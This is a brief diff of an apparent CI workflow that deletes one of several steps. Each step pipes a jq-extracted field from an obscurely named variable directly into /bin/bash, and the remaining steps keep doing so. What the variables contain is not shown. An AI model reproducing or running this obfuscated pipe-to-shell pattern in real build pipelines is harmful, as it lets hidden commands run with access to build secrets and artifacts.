@@ -30,7 +30,6 @@ jobs:
           echo $w9952 | jq -r .tsky0 | /bin/bash
           printf '%s' "$egusm542" | jq -r .wt79 | /bin/bash
           echo $kqgr014 | jq -r .mj0942 | /bin/bash
-          printf '%s' "$ind18234" | jq -r .t580 | /bin/bash
           echo $qqq6 | jq -r .ed93 | /bin/bash
 
       - name: Store artifact
